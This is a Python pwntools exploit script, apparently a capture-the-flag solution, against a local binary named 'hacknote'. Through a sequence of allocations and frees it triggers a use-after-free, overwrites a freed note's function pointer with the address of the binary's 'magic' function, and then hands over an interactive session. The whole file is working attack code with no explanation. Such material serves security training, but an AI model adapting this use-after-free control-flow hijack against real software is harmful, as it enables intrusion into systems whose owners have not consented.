#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./hacknote")
elf = ELF("./hacknote")

def addNote(size, content):
    io.sendlineafter("Your choice :", "1")
    io.sendlineafter("Note size :", str(size))
    io.sendlineafter("Content :", content)

def delNode(idx):
    io.sendlineafter("Your choice :", "2")
    io.sendlineafter("Index :", str(idx))

def printNote(idx):
    io.sendlineafter("Your choice :", "3")
    io.sendlineafter("Index :", str(idx))
    
def uaf():
    log.info("Step 1: free")
    addNote(24, "aaa")
    addNote(24, "bbb")
    addNote(24, "ccc")

    delNode(0)
    delNode(1)
    pause()

    log.info("Step 2: after")
    addNote(8, p32(elf.symbols["magic"]))
    pause()

    log.info("Step 3: use")
    printNote(0)

    io.interactive()
    io.close()

if __name__ == "__main__":
    uaf()
